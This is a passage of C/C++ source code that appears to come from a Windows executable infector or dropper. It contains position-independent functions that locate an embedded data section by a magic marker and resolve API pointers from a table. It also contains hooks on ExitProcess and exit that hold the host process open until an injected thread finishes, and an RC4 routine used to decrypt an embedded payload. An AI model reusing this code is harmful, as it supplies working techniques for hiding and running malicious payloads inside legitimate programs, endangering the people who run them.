	pfn_OutputDebugString(STRING(STRIDX_HFF5CALLED));
#endif

THREAD_EXIT:
	
	if (complete_path) pfn_VirtualFree(complete_path, 0, MEM_RELEASE);
	if (startupinfo) pfn_VirtualFree(startupinfo, 0, MEM_RELEASE);
	if (procinfo) pfn_VirtualFree(procinfo, 0, MEM_RELEASE);
	if (header->dllPath) pfn_VirtualFree(header->dllPath, 0, MEM_RELEASE);
	
	header->synchro = 1;
	
	return 0;
}
FUNCTION_END(CoreThreadProc);


VOID WINAPI ExitProcessHook(__in  UINT uExitCode)
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));

	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));

	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);

	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_INEXITPROC_HOOK));
#endif
	
	while (header->synchro != 1)
		pfn_Sleep(100);
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_VECTORQUIT));
#endif
	
	pfn_OriginalExitProcess(uExitCode);
}
FUNCTION_END(ExitProcessHook);

__declspec(noreturn) VOID __cdecl ExitHook(_In_ int status)
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
lbl_ref1:
		pop dwCurrentAddr
	}

	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));

	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
	
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
#ifdef _DEBUG
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
#endif

	EXIT pfn_OriginalExit = (EXIT) dll_calls[CALL_EXIT];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_INEXITPROC_HOOK));
#endif
	
	while (header->synchro != 1)
		pfn_Sleep(100);
	
#ifdef _DEBUG
	pfn_OutputDebugString(STRING(STRIDX_VECTORQUIT));
#endif
	
	pfn_OriginalExit(status);
}
FUNCTION_END(ExitHook);

void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
							unsigned char *data, size_t data_len, DataSectionHeader *header)
{
	unsigned int i, j, k;
	unsigned char *pos;
	size_t kpos;
	
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	
	unsigned char *S = (unsigned char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
	
	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}
	
	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}
	
	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
	
	pfn_VirtualFree(S, 0, MEM_RELEASE);
}
FUNCTION_END(rc4_skip);

#pragma code_seg()
#pragma optimize( "", on )

#endif /* WIN32 */

void generate_key(std::string& key, unsigned int length) 
{
	srand( (unsigned int) time(NULL) );
	
	std::ostringstream outStream;
	
	// initalize seed and fill array with random fuss
	for (unsigned int i = 0; i < length; i++) {
		outStream << std::setw(2) << std::setfill('0') << std::hex << (unsigned int) (rand() % 100);
	}

	key = outStream.str();
}